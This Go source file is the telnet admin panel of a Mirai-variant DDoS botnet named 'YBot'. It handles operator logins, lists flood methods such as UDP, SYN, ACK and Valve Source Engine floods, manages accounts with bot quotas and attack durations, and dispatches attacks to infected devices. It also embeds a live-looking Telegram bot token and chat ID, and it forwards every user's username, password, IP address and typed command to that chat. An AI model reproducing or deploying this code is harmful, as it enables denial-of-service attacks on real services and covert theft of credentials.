package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
	"log"
	"os"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"io"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
        this.conn.Write([]byte("\033[0m\033[2J\033[1H"))
        DisplayBanner(this, "/root/banners/login-screen.txt")
this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
    this.conn.Write([]byte("Username: "))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte("Password: "))
  password, err := this.ReadLine(true)
  if err != nil {
    return
  }
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo

	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Invalid Credentials! \007")))
		time.Sleep(1000 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	if len(username) > 0 && len(password) > 0 {
        bot, err := tgbotapi.NewBotAPI("5892175964:AAEBTua7w12QNZMwOLJmsyUCIVdz3E-ogDE")
        if err != nil {
            fmt.Println("Error: ", err)
        }
        msg := tgbotapi.NewMessage(2019081081, fmt.Sprintf("successful login | username: %s | password: %s | ip: %s", username, password, this.conn.RemoteAddr()))
        _, err = bot.Send(msg)
        if err != nil {
            fmt.Println("Error: ", err)
        }

        log.SetFlags(log.LstdFlags)
        loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
        if err != nil {
            fmt.Println("Error: ", err)
        }
        success := "successful login"
        usernameFormat := "username:"
        passwordFormat := "password:"
        ipFormat := "ip:"
        cmdSplit := "|"  
        log.SetOutput(loginLogsOutput)
        log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
    }


	time.Sleep(1 * time.Millisecond)

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d \007", BotCount))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d \007", BotCount))); err != nil {
                    this.conn.Close()
                    break
                }
            }
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	t := time.Now()
	formatedTime := t.Format(time.RFC1123)
	// banner
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033[0m \r\n"))
	this.conn.Write([]byte("\033[0m \r\n"))
	this.conn.Write([]byte("\033[0m                         \033[31mWelcome To \033[39mYBot \033[91mMirai Variant\r\n"))
	this.conn.Write([]byte(fmt.Sprintf("\033[0m               \033[31mUser Logged in At : \033[39m%s\033[0m\r\n", formatedTime)))
	this.conn.Write([]byte("\033[0m\r\n\r\n"))

	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     this.conn,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	for {
		var botCatagory string
		var botCount int

		this.conn.Write([]byte("\033[0m\033[97m" + username + " \033[33m# \033[0m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "lookup" || cmd == "geo" {
            this.conn.Write([]byte("Enter Target IP: "))
            target_ip, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(getGEO(target_ip) + "\r\n"))
            continue
        }
		if err != nil || cmd == "?" || cmd == "help" || cmd == "HELP" || cmd == "methods" {
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.udp			 \033[31m\" \033[90m Plain UDP flood optimized for speed    \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.syn			 \033[31m\" \033[90m SYN flood with options                 \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.int			 \033[31m\" \033[90m Char|Int based Flood                   \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.ack			 \033[31m\" \033[90m TCP ACK flood                          \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.stdhex		 \033[31m\" \033[90m UDP OVH HEX flood                      \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.vse			 \033[31m\" \033[90m Valve Source Engine query flood        \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.socket		 \033[31m\" \033[90m Socket Flood Rape Server CPU           \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.handshake		 \033[31m\" \033[90m TCP HANDSHAKE Flood                    \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m \033[31m* \033[0m.tcplegit		 \033[31m\" \033[90m Custom TCP ACK Flood                   \033[31m\"\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
        }
        if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[0m \r\n"))
			this.conn.Write([]byte("\033[0m \r\n"))
			this.conn.Write([]byte("\033[0m                         \033[31mWelcome To \033[39mYBot \033[91mMirai Variant\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m               \033[31mUser Logged in At : \033[39m%s\033[0m\r\n", formatedTime)))
			this.conn.Write([]byte("\033[0m\r\n\r\n"))
            continue
        }

		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}

		if err != nil || cmd == "admin" || cmd == "admin" {
			this.conn.Write([]byte("removeuser - remove a user.\r\n"))
			this.conn.Write([]byte("addbasic - Add a Basic Acount.\r\n"))
			this.conn.Write([]byte("addadmin - Add a Admin Account.\r\n"))
			continue
		}
		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			defer output.Close()
			
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|" 
			
			multiOutput := io.MultiWriter(output, os.Stdout)
			log.SetOutput(multiOutput)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
			
			bot, err := tgbotapi.NewBotAPI("5892175964:AAEBTua7w12QNZMwOLJmsyUCIVdz3E-ogDE")
			if err != nil {
				fmt.Println("Error: ", err)
			}
			msg := tgbotapi.NewMessage(2019081081, fmt.Sprintf("username: %s | command: %s | ip: %s", username, cmd, this.conn.RemoteAddr()))
			_, err = bot.Send(msg)
			if err != nil {
				fmt.Println("Error: ", err)
			}
		}

		if err != nil || cmd == "/users" || cmd == "/USERS" {
			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "\033[91mYou don't have the permission to execute this Command!\r\n")
				continue
			}
			for _, s := range sessions {
				line := fmt.Sprintf("%d, %s,", s.ID, s.Username)
				fmt.Fprintf(this.conn, "%s\r\n", (line))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("%s: %d\r\n", k, v)))
			}
			continue
		}
		if userInfo.admin == 0 && cmd == "clearlogs" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "clearlogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs from database? (better for stability) \033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[31mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[31mServerLogs\033[1;91m] Logs has been cleaned by \033[31m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }

		if cmd == "" {
			continue
		}

		if cmd == "@" {
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("/addbasic") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Network: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[92mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[92mUser created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Infinite flood time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Networ: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("User created! \r\n"))
			}
			continue
		}
		if isAdmin(userInfo) && cmd == strings.ToLower("removeuser") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
						var AttackCount int
                        if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                        } else {
                            AttackCount = clientList.Count()
                        }
                        this.conn.Write([]byte(fmt.Sprintf("\033[0m\033[31mInitiating Attack With \033[0m%d \033[31mConnected Devices\033[0m\r\n", AttackCount)))
						DisplayBanner(this, "/root/banners/attack-sent.txt")
                        fmt.Println("\033[93m(YBot) >> Command sent by \033[1;91m[" + username + "]\033[31m using command line.\033[0m\n")
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {

				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 500000)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\033' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}

func isAdmin(userInfo AccountInfo) bool {
	if userInfo.admin == 1 {
		return true
	}
	return false
}

func getRank(userInfo AccountInfo) string {
	if userInfo.admin == 1 {
		return "Admin"
	}
	return "User"
}